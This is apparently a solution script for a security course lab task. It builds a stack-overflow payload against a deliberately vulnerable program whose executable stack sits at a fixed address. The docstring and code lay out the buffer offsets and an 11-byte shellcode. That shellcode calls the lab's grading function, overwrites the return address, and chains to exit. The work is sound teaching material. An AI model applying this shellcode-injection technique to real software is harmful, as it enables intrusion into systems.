#!/usr/bin/env python3
"""Lab 3 / Task 2 -- attack/dark-calc: execute shellcode on the (RWX) stack.

``init_fixed_stack()`` mmaps a stack at the constant address
0x721000000000 with protection ``PROT_READ|PROT_WRITE|PROT_EXEC`` and puts a
guard page at 0x721000801000.  ``__wrap_main`` then switches RSP to
0x721000801000, so on every run

    expression      = 0x721000800fd0      (input: rbp-0x10)
    saved RBP       = 0x721000800fe0
    return address  = 0x721000800fe8

are the same: NX and ASLR are both bypassed by the program itself.  The guard
page leaves 0x30 bytes for the whole payload, so the shellcode is placed at the
very beginning of the buffer (24 bytes fit before the return address) and the
return address is pointed back at it.

Shellcode (11 bytes) -- call grade_eval(4):

    6a 04              push 4
    5f                 pop  rdi
    b8 87 1a 40 00     mov  eax, 0x401a87      ; grade_eval
    ff d0              call rax
    c3                 ret

``call rax`` keeps RSP 16-byte aligned for grade_eval's printf.  When
grade_eval returns it lands on the ``ret``, which pops the qword at 0xff0:
exit@plt.  So the program exits cleanly after printing the message.

  offset 0x00  shellcode (11 bytes) + NOP padding up to 0x18
  offset 0x18  return address = 0x721000800fd0   (start of shellcode)
  offset 0x20  0x401880 (exit@plt)               (consumed by the final ret)
"""
import struct
import sys

GRADE_EVAL   = 0x401A87
EXIT_PLT     = 0x401880
BUFFER_ADDR  = 0x721000800FD0   # input(): rbp-0x10, fixed by __wrap_main


def main() -> None:
    shellcode = b""
    shellcode += b"\x6a\x04"                              # push 4
    shellcode += b"\x5f"                                  # pop rdi
    shellcode += b"\xb8" + struct.pack("<I", GRADE_EVAL)  # mov eax, grade_eval
    shellcode += b"\xff\xd0"                              # call rax
    shellcode += b"\xc3"                                  # ret -> exit@plt

    payload = shellcode
    payload += b"\x90" * (0x18 - len(shellcode))          # pad up to saved RBP
    payload += struct.pack("<Q", BUFFER_ADDR)             # overwrite return addr
    payload += struct.pack("<Q", EXIT_PLT)                # [rsp] after `ret`

    assert len(payload) == 0x28, len(payload)
    assert b"\x0a" not in payload
    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()
